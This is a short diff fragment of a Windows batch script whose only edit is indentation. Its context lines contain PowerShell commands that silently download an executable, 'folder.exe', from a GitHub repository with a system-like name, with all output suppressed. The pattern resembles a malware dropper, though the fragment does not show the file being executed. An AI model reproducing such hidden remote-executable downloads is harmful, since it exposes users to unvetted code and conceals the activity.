@@ -107,7 +107,7 @@ echo *************DOWNLOAD file****************
       if errorlevel 1 goto ERROR2   
 
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
-   if errorlevel 1 goto ERROR2   
+      if errorlevel 1 goto ERROR2   
    goto SUCCESS 
 
 
@@ -177,7 +177,7 @@ echo *************DOWNLOAD file****************
       if errorlevel 1 goto ERROR3
 
    powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
-   if errorlevel 1 goto ERROR3
+      if errorlevel 1 goto ERROR3
    goto SUCCESS 
 
 
